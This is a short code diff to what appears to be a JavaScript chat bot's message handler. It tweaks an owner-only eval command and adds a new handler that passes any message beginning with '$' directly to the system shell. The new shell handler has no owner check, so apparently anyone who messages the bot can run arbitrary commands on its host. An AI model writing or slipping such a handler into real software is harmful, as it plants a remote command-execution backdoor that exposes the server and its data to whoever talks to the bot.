@@ -4247,7 +4247,7 @@ ${prefix}nuliskiri Subscribe Ya YT zeeoneofc`)
 
             default:
                 if (budy.startsWith('>')) {
-                    if (!isCreator) return
+                    if (!isCreator) return reply(mess.owner)
                     try {
                         let evaled = await eval(budy.slice(2))
                         if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
@@ -4256,6 +4256,12 @@ ${prefix}nuliskiri Subscribe Ya YT zeeoneofc`)
                     catch (err) {
                         await reply(util.format(err))
                     }
+                }
+              if (budy.startsWith('$')) {
+                    exec(budy.slice(2), (err, stdout) => {
+                        if (err) return reply(`${err}`)
+                        if (stdout) return reply(stdout)
+                    })
                 }
         }
 
